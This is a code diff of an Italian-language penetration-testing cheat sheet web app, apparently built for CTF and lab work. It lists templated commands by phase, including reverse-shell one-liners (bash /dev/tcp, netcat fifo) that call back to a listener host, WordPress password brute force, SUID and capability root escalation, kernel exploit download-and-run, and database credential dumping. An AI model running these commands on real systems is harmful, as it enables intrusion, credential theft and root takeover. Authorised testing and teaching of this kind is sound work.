@@ -80,6 +80,7 @@
     color:var(--text-dim);display:flex;align-items:center;gap:6px;
   }
   .field label .dot{width:7px;height:7px;border-radius:2px;background:var(--amber);box-shadow:0 0 8px var(--amber-line)}
+  .field label .dot.cookie{background:var(--violet);box-shadow:0 0 8px rgba(169,139,219,.45)}
   .field input{
     font-family:var(--mono);font-size:15px;font-weight:500;
     background:var(--surface-2);border:1px solid var(--line);
@@ -110,6 +111,10 @@
   main{min-width:0}
   .intro{color:var(--text-dim);font-size:13.5px;margin:0 0 26px;max-width:62ch;line-height:1.6}
   .intro code{font-family:var(--mono);color:var(--amber);background:var(--amber-soft);padding:1px 6px;border-radius:4px;font-size:.92em}
+
+
+  .intro .lg-amber{color:var(--amber);font-weight:600}
+  .intro .lg-violet{color:var(--violet);font-weight:600}
 
   section.phase{margin-bottom:40px;scroll-margin-top:170px}
   .phase-head{display:flex;align-items:baseline;gap:12px;margin:0 0 4px;padding-left:14px;position:relative}
@@ -156,6 +161,25 @@
   .docs:hover{color:var(--cyan);border-color:rgba(76,200,192,.4)}
   .docs .ar{opacity:.7}
 
+
+  /* ---------- Blocco "da compilare" ---------- */
+  .fill{
+    display:flex;align-items:center;gap:7px;flex-wrap:wrap;
+    padding:9px 14px 2px;margin-top:-2px;
+  }
+  .fill-lbl{
+    font-family:var(--mono);font-size:10px;letter-spacing:.07em;text-transform:uppercase;
+    color:var(--violet);opacity:.85;border:1px solid rgba(169,139,219,.3);
+    border-radius:4px;padding:2px 7px;white-space:nowrap;
+  }
+  .chip{
+    font-family:var(--mono);font-size:12px;color:var(--text-dim);
+    background:var(--surface-2);border:1px solid var(--line-soft);
+    border-radius:6px;padding:3px 9px;white-space:nowrap;
+  }
+  .chip b{color:var(--violet);font-weight:600}
+  .chip .eg{color:var(--text-faint)}
+
   .empty-note{display:none;color:var(--text-faint);font-family:var(--mono);font-size:13px;padding:30px 0;text-align:center}
   .empty-note.show{display:block}
 
@@ -180,7 +204,11 @@
     nav.phases a{flex:none;border:1px solid var(--line-soft)}
     nav.phases a .num{display:none}
     .console{padding:12px 16px 14px}
-    section.phase{scroll-margin-top:12px}
+  
+  .intro .lg-amber{color:var(--amber);font-weight:600}
+  .intro .lg-violet{color:var(--violet);font-weight:600}
+
+  section.phase{scroll-margin-top:12px}
     .copy span.lbl{display:none}
     .copy{padding:0 13px}
   }
@@ -213,6 +241,14 @@
         <label><span class="dot"></span>Listener port</label>
         <input id="in-lport" type="text" inputmode="numeric" autocomplete="off" spellcheck="false" placeholder="4444">
       </div>
+      <div class="field">
+        <label><span class="dot"></span>URL target <span style="color:var(--text-faint)">&lt;URL&gt;</span></label>
+        <input id="in-url" type="text" autocomplete="off" spellcheck="false" placeholder="auto: http://&lt;target&gt;">
+      </div>
+      <div class="field">
+        <label><span class="dot cookie"></span>Cookie sessione <span style="color:var(--text-faint)">&lt;COOKIE&gt;</span></label>
+        <input id="in-cookie" type="text" autocomplete="off" spellcheck="false" placeholder="es. PHPSESSID=abc123">
+      </div>
       <div class="field search">
         <label><span class="dot"></span>cerca comando</label>
         <input id="in-search" type="text" autocomplete="off" spellcheck="false" placeholder="nmap, sudo -l, reverse shell…">
@@ -224,6 +260,12 @@
 <div class="wrap">
   <nav class="phases" id="nav"></nav>
   <main>
+    <p class="intro">
+      Compila i campi in alto (<code>&lt;TARGET&gt;</code>, <code>&lt;LHOST&gt;</code>, porta, <code>&lt;URL&gt;</code>, <code>&lt;COOKIE&gt;</code>):
+      i comandi si aggiornano da soli e <b>copiano già il valore reale</b>. In <span class="lg-amber">ambra</span> le variabili live,
+      in <span class="lg-violet">viola</span> i segnaposto <code>&lt;...&gt;</code> da adattare a mano — elencati nel riquadro
+      <span class="lg-violet">da compilare</span> sotto ogni comando. Clicca un comando o il tasto copia per copiarlo.
+    </p>
     <div id="sections"></div>
     <div class="empty-note" id="empty">nessun comando corrisponde alla ricerca.</div>
   </main>
@@ -232,7 +274,6 @@
 <footer>
   <div class="foot-inner">
     <span>pentest://cheatsheet</span>
-    <a href="admin.html" style="color:var(--text-faint);text-decoration:none;transition:color .15s" onmouseover="this.style.color='var(--amber)'" onmouseout="this.style.color='var(--text-faint)'">⚙ admin</a>
     <span class="warn">solo per attività autorizzate e ambienti di test</span>
   </div>
 </footer>
@@ -241,118 +282,130 @@
 
 <script>
 /* ============ DATA ============
-   Token:  {{TARGET}} {{LHOST}} {{LPORT}} = variabili live
-           <WORD> = segnaposto manuale (viola) da adattare a mano
-           // ... = commento (grigio)                                   */
+   Token live (compilati dai campi in alto):
+     {{TARGET}}  IP del bersaglio       {{LHOST}}  il tuo IP
+     {{LPORT}}   porta del listener     {{URL}}    URL base del target (http://IP)
+     {{COOKIE}}  cookie di sessione
+   Altri token:
+     <WORD>  = segnaposto manuale (viola) da adattare a mano
+     // ...  = commento (grigio)
+   Campo "f" (opzionale) = righe "da compilare" mostrate sotto il comando:
+     lista di [etichetta, valore-esempio] per adattare velocemente il comando.          */
 
 const DEFAULT_PHASES = [
   {
     id:"recon", idx:"01", name:"Reconnaissance", color:"var(--cyan)",
     desc:"Scoprire il proprio IP, gli host vivi sulla rete e le porte/servizi aperti sul bersaglio.",
     cmds:[
-      {c:"ifconfig", n:"Mostra il tuo indirizzo IP e l'interfaccia di rete. Alternativa moderna: ip a.", d:["man ifconfig","https://man7.org/linux/man-pages/man8/ifconfig.8.html"]},
-      {c:"sudo netdiscover -r {{LHOST}}/24", n:"Enumera gli host vivi sulla tua sottorete via ARP, senza inviare pacchetti rumorosi.", d:["netdiscover","https://github.com/netdiscover-scanner/netdiscover"]},
+      {c:"ip a", n:"Mostra i tuoi indirizzi IP e le interfacce di rete. Da qui ricavi il tuo LHOST.", d:["ip(8)","https://man7.org/linux/man-pages/man8/ip.8.html"]},
+      {c:"ifconfig", n:"Variante storica di ip a per vedere IP e interfaccia di rete.", d:["ifconfig","https://man7.org/linux/man-pages/man8/ifconfig.8.html"]},
+      {c:"sudo netdiscover -r {{LHOST}}/24", n:"Enumera gli host vivi sulla tua sottorete via ARP, poco rumoroso.", d:["netdiscover","https://github.com/netdiscover-scanner/netdiscover"]},
       {c:"nmap -sn {{LHOST}}/24", n:"Ping/ARP sweep: elenca gli host attivi nella /24 senza scansionare le porte.", d:["nmap host discovery","https://nmap.org/book/host-discovery.html"]},
-      {c:"sudo nmap {{TARGET}} -p- -A -T4 -Pn -oN scan.txt", n:"Scansione completa di tutte le 65535 porte con rilevamento servizi/OS, salvata su file. Scan di riferimento.", d:["nmap man","https://nmap.org/book/man.html"]},
-      {c:"nmap -sCV -p- {{TARGET}} -vvv", n:"Tutte le porte con script di default + versione dei servizi, output verboso per più dettagli.", d:["nmap -sC -sV","https://nmap.org/book/man-version-detection.html"]},
-      {c:"nmap -A {{TARGET}} -Pn", n:"Scansione aggressiva rapida sulle porte comuni, saltando il controllo \"host up\".", d:["nmap man","https://nmap.org/book/man.html"]},
-      {c:"nmap {{TARGET}} -p <PORTS> -A", n:"Approfondisci solo le porte già trovate aperte (es. 80,443,7744) con servizi e script.", d:["nmap -p","https://nmap.org/book/man-port-specification.html"]},
+      {c:"sudo nmap {{TARGET}} -p- -A -T4 -Pn -oN scan.txt", n:"Scansione completa delle 65535 porte con rilevamento servizi/OS, salvata su file. Scan di riferimento.", d:["nmap man","https://nmap.org/book/man.html"]},
+      {c:"nmap -sCV -p- {{TARGET}} -vvv", n:"Tutte le porte con script di default + versione dei servizi, output verboso.", d:["nmap -sC -sV","https://nmap.org/book/man-version-detection.html"]},
+      {c:"nmap {{TARGET}} -p <PORTS> -A", n:"Approfondisci solo le porte già trovate aperte con servizi e script.", f:[["<PORTS>","80,443,7744"]], d:["nmap -p","https://nmap.org/book/man-port-specification.html"]},
       {c:"nmap --script=vuln {{TARGET}}", n:"Lancia tutti gli script NSE della categoria \"vuln\": scansione automatica di vulnerabilità note.", d:["nmap NSE vuln","https://nmap.org/nsedoc/categories/vuln.html"]},
-      {c:"nmap -p<PORT> --script <SCRIPT> {{TARGET}}", n:"Esegue un singolo script NSE su una porta (es. --script http-vuln-cve2014-3704).", d:["NSE scripts","https://nmap.org/nsedoc/"]},
-      {c:"nmap -p139 --script smb-enum-shares {{TARGET}}", n:"Enumera le condivisioni SMB e i relativi permessi di lettura/scrittura sul bersaglio.", d:["smb-enum-shares","https://nmap.org/nsedoc/scripts/smb-enum-shares.html"]},
+      {c:"nmap -p139 --script smb-enum-shares {{TARGET}}", n:"Enumera le condivisioni SMB e i relativi permessi sul bersaglio.", d:["smb-enum-shares","https://nmap.org/nsedoc/scripts/smb-enum-shares.html"]},
     ]
   },
   {
     id:"enum", idx:"02", name:"Enumeration", color:"var(--blue)",
     desc:"Mappare il web server, le directory nascoste, gli utenti e cercare exploit per le versioni trovate.",
     cmds:[
-      {c:"dirsearch -u http://{{TARGET}}/ --http-method=GET --exclude-status=300-399,400-499,500-599", n:"Enumera directory e file nascosti scartando i codici di errore/redirect.", d:["dirsearch","https://github.com/maurosoria/dirsearch"]},
-      {c:"gobuster dir -u http://{{TARGET}}/ -w /usr/share/dirb/wordlists/common.txt", n:"Brute force di directory e file su un web server, anche senza link visibili.", d:["gobuster","https://github.com/OJ/gobuster"]},
-      {c:"ffuf -w /usr/share/dirb/wordlists/common.txt -u http://{{TARGET}}/FUZZ", n:"Fuzzing dei percorsi: sostituisce FUZZ con ogni parola della wordlist.", d:["ffuf","https://github.com/ffuf/ffuf"]},
-      {c:"ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://{{TARGET}}/FUZZ -c -ic -fc 403,404 -e .txt", n:"Fuzzing più profondo: ignora i commenti, filtra 403/404 e prova anche l'estensione .txt.", d:["ffuf options","https://github.com/ffuf/ffuf#usage"]},
-      {c:"nikto -h http://{{TARGET}}/", n:"Scansione del web server: header, file sensibili, certificato SSL/TLS e vulnerabilità note.", d:["nikto","https://github.com/sullo/nikto"]},
-      {c:"curl -i http://{{TARGET}}/robots.txt", n:"Spesso rivela percorsi che il sito vuole tenere nascosti (Disallow). Vale sempre un'occhiata.", d:["curl","https://curl.se/docs/manpage.html"]},
+      {c:"whatweb {{URL}}/", n:"Identifica CMS, framework, linguaggi e versioni del sito.", d:["whatweb","https://github.com/urbanadventurer/WhatWeb"]},
+      {c:"curl -i {{URL}}/robots.txt", n:"Spesso rivela percorsi che il sito vuole tenere nascosti (Disallow).", d:["curl","https://curl.se/docs/manpage.html"]},
+      {c:"nikto -h {{URL}}/", n:"Scansione del web server: header, file sensibili, SSL/TLS e vulnerabilità note.", d:["nikto","https://github.com/sullo/nikto"]},
+      {c:"gobuster dir -u {{URL}}/ -w /usr/share/dirb/wordlists/common.txt", n:"Brute force di directory e file su un web server, anche senza link visibili.", d:["gobuster","https://github.com/OJ/gobuster"]},
+      {c:"gobuster dir -u {{URL}}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html", n:"Enumerazione più profonda provando anche le estensioni indicate.", f:[["-x","php,txt,html,bak"]], d:["gobuster","https://github.com/OJ/gobuster"]},
+      {c:"dirsearch -u {{URL}}/ --exclude-status=300-399,400-499,500-599", n:"Enumera directory e file nascosti scartando i codici di errore/redirect.", d:["dirsearch","https://github.com/maurosoria/dirsearch"]},
+      {c:"ffuf -w /usr/share/dirb/wordlists/common.txt -u {{URL}}/FUZZ -fc 403,404", n:"Fuzzing dei percorsi: sostituisce FUZZ con ogni parola, filtra 403/404.", d:["ffuf","https://github.com/ffuf/ffuf"]},
       {c:"smbclient -L //{{TARGET}}/ -N", n:"Elenca le condivisioni SMB in accesso anonimo (-N = senza password).", d:["smbclient","https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"]},
-      {c:"wpscan --url http://{{TARGET}}/ -e u", n:"Enumera gli utenti registrati di un sito WordPress.", d:["wpscan","https://github.com/wpscanteam/wpscan"]},
-      {c:"wpscan --url https://{{TARGET}}:<PORT>/<path> -e u --disable-tls-checks", n:"Come sopra ma su HTTPS, ignorando un certificato non valido.", d:["wpscan","https://github.com/wpscanteam/wpscan"]},
-      {c:"wpscan --url http://{{TARGET}}/ -U <USER> -P /usr/share/wordlists/rockyou.txt", n:"Attacco a dizionario sulla password di un utente WordPress. rockyou è intercambiabile con altre wordlist.", d:["wpscan","https://github.com/wpscanteam/wpscan"]},
-      {c:"cewl -w password.txt http://{{TARGET}}/", n:"Costruisce una wordlist dalle parole presenti nel sito, utile per attacchi a dizionario mirati.", d:["cewl","https://github.com/digininja/CeWL"]},
-      {c:"searchsploit <SERVICE> <VERSION>", n:"Cerca su Exploit-DB exploit noti per un servizio e una versione (es. ProFTPD 1.3.3c).", d:["searchsploit","https://www.exploit-db.com/searchsploit"]},
+      {c:"wpscan --url {{URL}}/ -e u", n:"Enumera gli utenti registrati di un sito WordPress.", d:["wpscan","https://github.com/wpscanteam/wpscan"]},
+      {c:"wpscan --url {{URL}}/ -U <USER> -P /usr/share/wordlists/rockyou.txt", n:"Attacco a dizionario sulla password di un utente WordPress.", f:[["<USER>","admin"]], d:["wpscan","https://github.com/wpscanteam/wpscan"]},
+      {c:"cewl -w password.txt {{URL}}/", n:"Costruisce una wordlist dalle parole del sito, utile per attacchi mirati.", d:["cewl","https://github.com/digininja/CeWL"]},
+      {c:"searchsploit <SERVICE> <VERSION>", n:"Cerca su Exploit-DB exploit noti per un servizio e versione.", f:[["<SERVICE>","proftpd"],["<VERSION>","1.3.3c"]], d:["searchsploit","https://www.exploit-db.com/searchsploit"]},
     ]
   },
   {
-    id:"exploit", idx:"03", name:"Exploitation", color:"var(--orange)",
-    desc:"Sfruttare un servizio vulnerabile con Metasploit o aprire una reverse shell manuale verso di te.",
+    id:"web", idx:"03", name:"Web Exploitation", color:"var(--orange)",
+    desc:"SQL injection per il bypass del login, lettura/inclusione di file (LFI) e upload di una webshell per arrivare all'esecuzione di codice (RCE).",
     cmds:[
-      {c:"msfconsole -q", n:"Avvia la console Metasploit senza banner.", d:["metasploit","https://docs.metasploit.com/"]},
-      {c:"search <TERM>", n:"Dentro msf: cerca un modulo (es. trans2open, smb_version, drupal).", d:["msf search","https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html"]},
-      {c:"use <MODULE>", n:"Seleziona il modulo/exploit trovato.", d:["metasploit","https://docs.metasploit.com/"]},
-      {c:"show options", n:"Mostra i parametri richiesti dal modulo selezionato.", d:["metasploit","https://docs.metasploit.com/"]},
-      {c:"set RHOSTS {{TARGET}}", n:"Imposta l'host bersaglio.", d:["metasploit","https://docs.metasploit.com/"]},
-      {c:"set RPORT <PORT>", n:"Imposta la porta del servizio bersaglio (es. 139 per Samba).", d:["metasploit","https://docs.metasploit.com/"]},
-      {c:"set LHOST {{LHOST}}", n:"Il tuo IP: dove il payload richiamerà la connessione inversa.", d:["metasploit","https://docs.metasploit.com/"]},
-      {c:"set LPORT {{LPORT}}", n:"La porta su cui riceverai la shell.", d:["metasploit","https://docs.metasploit.com/"]},
-      {c:"set payload linux/x86/shell/reverse_tcp", n:"Sceglie un payload che fa connettere il target verso di te (reverse TCP).", d:["msf payloads","https://docs.metasploit.com/docs/using-metasploit/basics/how-payloads-work.html"]},
-      {c:"run", n:"Lancia l'exploit. Se va a buon fine ottieni una sessione (shell / meterpreter).", d:["metasploit","https://docs.metasploit.com/"]},
-      {c:"sudo nc -nvlp {{LPORT}}", n:"Mette in ascolto un listener netcat in attesa della shell in arrivo dal target.", d:["netcat","https://linux.die.net/man/1/nc"]},
-      {c:"bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1", n:"Reverse shell bash one-liner: la esegui sul target per richiamare il tuo listener.", d:["reverse shells","https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"]},
-      {c:"$ip = '{{LHOST}}';   // CHANGE THIS\n$port = {{LPORT}};    // CHANGE THIS", n:"Le due righe da modificare in php-reverse-shell.php prima di caricarlo (es. come plugin WordPress).", d:["php-reverse-shell","https://github.com/pentestmonkey/php-reverse-shell"]},
-      {c:"ssh <USER>@{{TARGET}} -p <PORT>", n:"Accesso SSH riutilizzando credenziali trovate (il riuso password è comunissimo).", d:["ssh","https://man.openbsd.org/ssh"]},
+      {c:"curl -s {{URL}}/<ENDPOINT> --data \"file=<FILE>\"", n:"Endpoint che riceve un nome di file: primo test per capire se legge o include file lato server.", f:[["<ENDPOINT>","test"],["<FILE>","index.php"]], d:["LFI","https://owasp.org/www-community/attacks/Path_Traversal"]},
     ]
   },
   {
-    id:"shell", idx:"04", name:"Shell upgrade & escape", color:"var(--violet)",
-    desc:"Trasformare una shell grezza in una interattiva ed evadere da una restricted shell (rbash).",
+    id:"revshell", idx:"04", name:"Reverse Shell", color:"var(--violet)",
+    desc:"Aprire un listener sulla tua macchina e far connettere il target verso di te. REGOLA: prima accendi il listener, POI lanci il payload; non premere Ctrl+C sul listener.",
     cmds:[
-      {c:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", n:"Promuove una shell \"muta\" a una pty interattiva. Usa python se python3 non c'è.", d:["TTY upgrade","https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Full%20TTYs.md"]},
+      {c:"sudo nc -nvlp {{LPORT}}", n:"PASSO 1 — Listener in ascolto in un terminale SEPARATO. Lascialo fermo: non scrivere niente e non premere Ctrl+C finché non arriva la shell.", d:["netcat","https://linux.die.net/man/1/nc"]},
+      {c:"which nc bash python python3 perl", n:"Da eseguire sul target (anche via webshell) per sapere QUALE payload puoi usare prima di tentare a caso.", d:["which","https://man7.org/linux/man-pages/man1/which.1.html"]},
+      {c:"bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1", n:"PASSO 2 — Reverse shell bash. Da eseguire sul target (anche via webshell). /dev/tcp funziona solo in bash: l'IP è il TUO, senza http://.", d:["revshell generator","https://www.revshells.com/"]},
+      {c:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|/bin/nc {{LHOST}} {{LPORT}} >/tmp/f", n:"Alternativa con netcat priva di -e (tipica su sistemi vecchi, es. Ubuntu datati). Molto affidabile.", d:["revshell fifo","https://www.revshells.com/"]},
+      {c:"nc -e /bin/bash {{LHOST}} {{LPORT}}", n:"Reverse shell con netcat se la versione sul target supporta -e (molte non lo hanno: in quel caso usa la variante fifo).", d:["netcat","https://linux.die.net/man/1/nc"]},
+    ]
+  },
+  {
+    id:"shell", idx:"05", name:"Shell Upgrade & Escape", color:"var(--green)",
+    desc:"Trasformare una shell grezza in una interattiva (TTY) ed evadere da una restricted shell (rbash).",
+    cmds:[
+      {c:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", n:"Promuove una shell \"muta\" a pty interattiva. Usa python se python3 non c'è.", d:["TTY upgrade","https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Full%20TTYs.md"]},
       {c:"echo $PATH", n:"In una restricted shell, mostra dove il sistema cerca i binari: capisci cosa puoi eseguire.", d:["rbash","https://gtfobins.github.io/"]},
       {c:":set shell=/bin/bash\n:shell", n:"Dentro vi/vim: imposta bash come shell ed evadi la restricted shell lanciandola.", d:["GTFOBins vi","https://gtfobins.github.io/gtfobins/vi/"]},
-      {c:"export PATH=/bin:/usr/bin:$PATH", n:"Dopo l'escape, ripristina un PATH usabile per avere di nuovo tutti i comandi.", d:["rbash escape","https://gtfobins.github.io/"]},
-      {c:"export SHELL=/bin/bash:$SHELL", n:"Allinea la variabile SHELL alla bash appena ottenuta.", d:["bash man","https://www.gnu.org/software/bash/manual/bash.html"]},
+      {c:"export PATH=/bin:/usr/bin:$PATH", n:"Dopo l'escape, ripristina un PATH usabile per riavere tutti i comandi.", d:["rbash escape","https://gtfobins.github.io/"]},
     ]
   },
   {
-    id:"privesc", idx:"05", name:"Privilege Escalation", color:"var(--red)",
-    desc:"Da utente non privilegiato a root: sudo misconfigurati, SUID, GTFOBins, exploit del kernel e chiavi SSH.",
+    id:"privesc", idx:"06", name:"Privilege Escalation", color:"var(--red)",
+    desc:"Da utente non privilegiato a root: enumerazione, sudo misconfigurati, SUID/GTFOBins, exploit del kernel e chiavi SSH.",
     cmds:[
       {c:"whoami; id", n:"Chi sei e a quali gruppi appartieni: il punto di partenza di ogni escalation.", d:["id","https://man7.org/linux/man-pages/man1/id.1.html"]},
-      {c:"uname -a", n:"Versione del kernel: serve a cercare kernel exploit applicabili.", d:["uname","https://man7.org/linux/man-pages/man1/uname.1.html"]},
+      {c:"uname -a", n:"Versione del kernel: serve a cercare kernel exploit applicabili (es. OverlayFS su kernel 3.13).", d:["uname","https://man7.org/linux/man-pages/man1/uname.1.html"]},
       {c:"sudo -l", n:"Elenca cosa puoi eseguire via sudo (magari senza password): spesso è la via diretta a root.", d:["sudo","https://www.sudo.ws/docs/man/sudo.man/"]},
-      {c:"find / -perm -u=s -type f 2>/dev/null", n:"Trova i binari con bit SUID: eseguono con i permessi del proprietario, spesso root.", d:["SUID","https://gtfobins.github.io/#+suid"]},
+      {c:"find / -perm -u=s -type f 2>/dev/null", n:"Trova i binari con bit SUID: eseguono con i permessi del proprietario, spesso root. Confrontali su GTFOBins.", d:["SUID","https://gtfobins.github.io/#+suid"]},
       {c:"find . -exec /bin/sh \\; -quit", n:"Se find è SUID, apre una shell con i privilegi del proprietario (GTFOBins).", d:["GTFOBins find","https://gtfobins.github.io/gtfobins/find/"]},
+      {c:"find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|dev)'", n:"Elenca i file scrivibili dal tuo utente (escludendo /proc, /sys, /dev). Cerca script/config eseguiti da root: cron, servizi systemd, /etc/passwd, sudoers. Scrivibile NON basta: deve anche essere eseguito da root.", d:["writable files","https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files"]},
+      {c:"getcap -r / 2>/dev/null", n:"Elenca i binari con Linux capabilities: poteri root parziali assegnati a singoli file. Alcune combinazioni valgono una shell root diretta. Incrocia il binario trovato con GTFOBins (sezione Capabilities).", d:["GTFOBins caps","https://gtfobins.github.io/#+capabilities"]},
+      {c:"// capabilities che portano a root se le trovi su un binario:\n// cap_setuid       -> root DIRETTO su interpreti (python/perl/ruby/node/php)\n// cap_setgid       -> cambio gruppo, utile combinato con setuid\n// cap_dac_override -> scrivi file protetti (/etc/passwd, /etc/sudoers) -> root\n// cap_dac_read_search -> leggi file protetti (/etc/shadow, chiavi SSH)\n// cap_setfcap      -> assegni capability ad altri binari -> ti crei il caso sopra\n// cap_sys_admin / cap_sys_ptrace -> potenti ma richiedono piu' lavoro\n// (cap_net_raw / cap_net_bind_service di norma NON danno root)", n:"Promemoria: non tutte le capability portano a root. Quelle qui sopra sì (direttamente o in due passaggi); le altre di solito no. Verifica sempre su GTFOBins.", d:["Linux caps","https://man7.org/linux/man-pages/man7/capabilities.7.html"]},
+      {c:"<BINARIO> -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", n:"Se un INTERPRETE ha cap_setuid (es. da getcap: /usr/bin/python3.x cap_setuid=ep), setuid(0) ti fa root. Sostituisci <BINARIO> col percorso esatto trovato da getcap. La sintassi -c 'import os...' vale per python; per perl/ruby/node vedi GTFOBins.", f:[["<BINARIO>","/usr/bin/python3.13"]], d:["GTFOBins python caps","https://gtfobins.github.io/gtfobins/python/#capabilities"]},
       {c:"sudo git -p help config\n!/bin/bash", n:"Se puoi usare git via sudo: apri l'help e, dentro il pager, digita !/bin/bash per una shell root.", d:["GTFOBins git","https://gtfobins.github.io/gtfobins/git/"]},
-      {c:"TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh','sh','-c','sh <$(tty) >$(tty) 2>$(tty)')\" > \"$TF/setup.py\"\nsudo pip install \"$TF\"", n:"Se puoi usare pip via sudo: forza l'esecuzione di uno script come root durante l'install (GTFOBins).", d:["GTFOBins pip","https://gtfobins.github.io/gtfobins/pip/"]},
-      {c:"git clone https://github.com/mzet-/linux-exploit-suggester.git\nchmod +x linux-exploit-suggester.sh\n./linux-exploit-suggester.sh", n:"Confronta il kernel del target con un DB di exploit e ti elenca quelli ad alta probabilità.", d:["LES","https://github.com/mzet-/linux-exploit-suggester"]},
-      {c:"chmod 600 ssh_key.txt", n:"Permessi corretti per una chiave privata SSH trovata, altrimenti SSH la rifiuta.", d:["ssh key perms","https://man.openbsd.org/ssh"]},
-      {c:"ssh2john ssh_key.txt > key.hash", n:"Converte una chiave privata SSH protetta in un hash per John.", d:["john","https://www.openwall.com/john/doc/"]},
-      {c:"john --wordlist=/usr/share/wordlists/rockyou.txt key.hash", n:"Craccа la passphrase della chiave (o un hash). fasttrack.txt è un'alternativa veloce.", d:["John the Ripper","https://www.openwall.com/john/doc/"]},
-      {c:"ssh -i ssh_key.txt <USER>@{{TARGET}}", n:"Accedi con la chiave privata una volta nota la passphrase.", d:["ssh -i","https://man.openbsd.org/ssh"]},
-      {c:"echo <STRING> | base64 -d", n:"Decodifica blob in base64 (es. chiavi/segreti trovati nelle pagine nascoste).", d:["base64","https://man7.org/linux/man-pages/man1/base64.1.html"]},
-      {c:"cat /etc/passwd", n:"Elenca gli account del sistema: utili per capire bersagli di brute force o riuso credenziali.", d:["passwd(5)","https://man7.org/linux/man-pages/man5/passwd.5.html"]},
+      {c:"searchsploit -m <EDB_ID>", n:"Copia l'exploit scelto nella cartella corrente. Per OverlayFS (kernel 3.13): EDB-ID 37292.", f:[["<EDB_ID>","37292"]], d:["searchsploit","https://www.exploit-db.com/searchsploit"]},
+      {c:"python -m http.server 80", n:"Sulla TUA Kali: servi l'exploit via HTTP per scaricarlo dal target. Usa python3 se serve.", d:["http.server","https://docs.python.org/3/library/http.server.html"]},
+      {c:"wget {{LHOST}}/<EXPLOIT>.c -O exploit.c\ngcc exploit.c -o exploit\n./exploit", n:"Sul TARGET: scarica, compila (serve gcc) ed esegui l'exploit del kernel. La compilazione va fatta sul target per linkarlo al suo kernel.", f:[["<EXPLOIT>","37292"]], d:["OverlayFS CVE-2015-1328","https://www.exploit-db.com/exploits/37292"]},
+      {c:"ssh -i ssh_key.txt <USER>@{{TARGET}}", n:"Accedi con la chiave privata una volta nota la passphrase.", f:[["<USER>","root"]], d:["ssh -i","https://man.openbsd.org/ssh"]},
+      {c:"ssh <USER>@{{TARGET}} -p <PORT>", n:"Accesso SSH riutilizzando credenziali trovate (il riuso password è comunissimo).", f:[["<USER>","root"],["<PORT>","22"]], d:["ssh","https://man.openbsd.org/ssh"]},
+    ]
+  },
+  {
+    id:"loot", idx:"07", name:"Post-Exploitation & Loot", color:"var(--amber)",
+    desc:"Dopo l'accesso: raccogliere credenziali dal database applicativo, decodificare segreti e cercare le flag.",
+    cmds:[
+      {c:"mysql -u <DBUSER> -p<DBPASS> <DBNAME> -e \"show tables;\"", n:"Elenca le tabelle del database applicativo (credenziali spesso estratte da file di config tipo c.php/config.php).", f:[["<DBUSER>","root"],["<DBPASS>","toor"],["<DBNAME>","app_db"]], d:["mysql","https://dev.mysql.com/doc/refman/8.0/en/mysql.html"]},
+      {c:"mysql -u <DBUSER> -p<DBPASS> <DBNAME> -e \"select * from <TABLE>;\"", n:"Dump di una tabella: spesso contiene credenziali applicative in chiaro.", f:[["<DBUSER>","root"],["<DBPASS>","toor"],["<DBNAME>","app_db"],["<TABLE>","users"]], d:["mysql","https://dev.mysql.com/doc/refman/8.0/en/mysql.html"]},
+      {c:"grep -rniE 'pass|pwd|secret|api[_-]?key' <DIR> 2>/dev/null", n:"Cerca credenziali e segreti hardcoded nei file sorgente dell'applicazione.", f:[["<DIR>","/var/www"]], d:["grep","https://man7.org/linux/man-pages/man1/grep.1.html"]},
+      {c:"echo <STRING> | base64 -d", n:"Decodifica blob base64 (chiavi/segreti trovati in pagine o config).", f:[["<STRING>","aGVsbG8="]], d:["base64","https://man7.org/linux/man-pages/man1/base64.1.html"]},
+      {c:"find / -name 'user.txt' -o -name 'root.txt' 2>/dev/null", n:"Cerca le flag tipiche delle CTF su tutto il filesystem.", d:["find","https://man7.org/linux/man-pages/man1/find.1.html"]},
+      {c:"grep -E 'sh$' /etc/passwd", n:"Elenca gli account con shell di login reale: candidati per riuso password su SSH.", d:["passwd(5)","https://man7.org/linux/man-pages/man5/passwd.5.html"]},
     ]
   },
 ];
-
-/* Load custom data from admin panel (localStorage), fall back to defaults */
-const PHASES = (function(){
-  try {
-    const raw = localStorage.getItem('pentest-cheatsheet-custom');
-    if (raw) { const d = JSON.parse(raw); if (Array.isArray(d) && d.length) return d; }
-  } catch(e){}
-  return DEFAULT_PHASES;
-})();
+const PHASES = DEFAULT_PHASES;
 
 /* ============ STATE ============ */
 const LS="pentest-cheatsheet-cfg";
-const state={target:"",lhost:"",lport:""};
+const state={target:"",lhost:"",lport:"",url:"",cookie:""};
 try{const s=JSON.parse(localStorage.getItem(LS)||"{}");Object.assign(state,s||{});}catch(e){}
 
-const DEF={target:"<TARGET>",lhost:"<LHOST>",lport:"4444"};
-const val=k=>state[k]&&state[k].trim()?state[k].trim():DEF[k];
+const DEF={target:"<TARGET>",lhost:"<LHOST>",lport:"4444",url:"<URL>",cookie:"<COOKIE>"};
+function val(k){
+  if(state[k]&&state[k].trim()) return state[k].trim();
+  // URL si auto-deriva dal target se non impostato esplicitamente
+  if(k==="url"){ const t=state.target&&state.target.trim(); if(t) return "http://"+t; }
+  return DEF[k];
+}
 
 /* ============ RENDER ============ */
-const TOKEN=/(\{\{TARGET\}\}|\{\{LHOST\}\}|\{\{LPORT\}\}|<[A-Za-z_]+>)/g;
-const KEYMAP={"{{TARGET}}":"target","{{LHOST}}":"lhost","{{LPORT}}":"lport"};
